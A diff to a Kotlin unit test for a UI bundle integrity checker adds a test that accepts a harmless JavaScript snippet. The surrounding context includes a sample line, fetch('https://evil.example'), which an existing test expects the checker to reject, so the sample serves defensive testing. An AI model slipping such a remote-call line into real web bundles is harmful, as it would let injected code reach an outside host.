@@ -25,6 +25,11 @@ class UiBundleIntegrityTest {
         assertFalse(UiBundleIntegrity.matches("index.html", unsafe, UiBundleIntegrity.sha256(unsafe)))
     }
 
+    @Test fun acceptsBundledStyleJavascriptWithoutDynamicExecution() {
+        val safe = "(function(){document.title='Vyom'})()".toByteArray()
+        assertTrue(UiBundleIntegrity.isSafeContent("app.js", safe))
+    }
+
     @Test fun rejectsJavascriptThatCanReachRemoteOrDynamicCodeExecution() {
         val unsafe = "fetch('https://evil.example')".toByteArray()
         assertFalse(UiBundleIntegrity.matches("app.js", unsafe, UiBundleIntegrity.sha256(unsafe)))
